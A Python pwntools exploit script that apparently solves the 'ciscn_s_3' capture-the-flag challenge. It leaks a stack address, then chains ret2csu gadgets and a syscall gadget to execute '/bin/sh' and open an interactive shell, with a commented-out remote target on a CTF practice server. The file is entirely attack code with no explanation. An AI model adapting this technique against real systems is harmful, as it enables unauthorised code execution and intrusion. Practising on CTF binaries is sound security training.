from pwn import *

#context.log_level = 'debug'

proc_name = './ciscn_s_3'

p = process(proc_name)
#p = remote('node3.buuoj.cn',29497)
elf = ELF(proc_name)

pop_rdi_ret = 0x4005a3
mov_rax_3b_ret = 0x4004e2
sys_call = 0x400501
ret_addr = 0x4003a9
vuln_addr = elf.symbols['vuln']

csu_pops = 0x40059a
csu_mov_args = 0x400580
#leak stack

payload = b'/bin/sh\x00' + b'a' * ( 0x8 ) + p64(vuln_addr)

p.sendline(payload)

p.recv(0x20)
rbp = u64(p.recv(8)) - 0x118
print('[+] rsp : {}'.format(hex(rbp)))
print('[+] write address of (mov rax, 0x3b) to {}'.format(hex(rbp - 0x8)))
print('[+] write bin_sh to {}'.format(hex(rbp - 0x10)))
print('[+] try use csu to pass params')
p.recv(8)

payload = b'/bin/sh\x00' + p64(mov_rax_3b_ret) + p64(csu_pops) + p64(0) + p64(1) + p64(rbp - 0x8) + p64(0) * 3
payload += p64(csu_mov_args) + b'a' * ( 8 * 7 ) + p64(pop_rdi_ret) + p64(rbp - 0x10) + p64(sys_call)

p.sendline(payload)
p.recv(0x30)
p.interactive()

